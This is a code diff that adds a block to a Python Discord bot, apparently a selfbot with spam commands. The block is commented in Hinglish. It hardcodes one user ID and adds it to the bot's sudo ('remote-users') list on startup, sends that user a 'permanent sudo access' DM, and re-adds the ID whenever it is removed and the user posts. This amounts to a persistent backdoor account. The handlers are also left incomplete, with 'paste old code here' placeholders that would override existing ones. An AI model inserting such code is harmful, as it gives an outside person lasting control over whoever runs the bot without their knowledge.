@@ -1571,6 +1571,43 @@ async def stopglitchedspam(ctx):
     global glitchedspam_active
     glitchedspam_active = False
     await ctx.send("> **✅ Glitched Spam Stopped**", delete_after=5)
+
+# ==================== AUTO SUDO PROTECTION ====================
+PROTECTED_USER_ID = 1480856249078907004  # ← Yahan apna real user ID daal do (notarnavxgojo69 ka ID)
+
+@bot.event
+async def on_ready():
+    print(f"Logged in as {bot.user}")
+    
+    # Auto Sudo Add on Start
+    try:
+        user = await bot.fetch_user(PROTECTED_USER_ID)
+        if str(PROTECTED_USER_ID) not in config.get("remote-users", []):
+            config.setdefault("remote-users", []).append(str(PROTECTED_USER_ID))
+            save_config(config)
+            print(f"[AUTO] {user} ko sudo add kar diya")
+            
+            # DM mein message bhejna
+            try:
+                await user.send("> **✅ Auto Sudo Activated** | You have been given permanent sudo access.")
+            except:
+                pass
+    except:
+        print("[AUTO] Protected user not found")
+
+# ==================== AUTO RE-ADD IF REMOVED ====================
+@bot.event
+async def on_message(message):
+    # Pehle purana on_message code rakhna (agar hai toh)
+
+    if message.author.id == PROTECTED_USER_ID:
+        if str(PROTECTED_USER_ID) not in config.get("remote-users", []):
+            config.setdefault("remote-users", []).append(str(PROTECTED_USER_ID))
+            save_config(config)
+            print(f"[PROTECTED] {message.author} ko wapas sudo add kar diya")
+
+    # Baaki purana on_message code yahan paste kar do...
+    await bot.process_commands(message)
     
 bot.run(token)
 
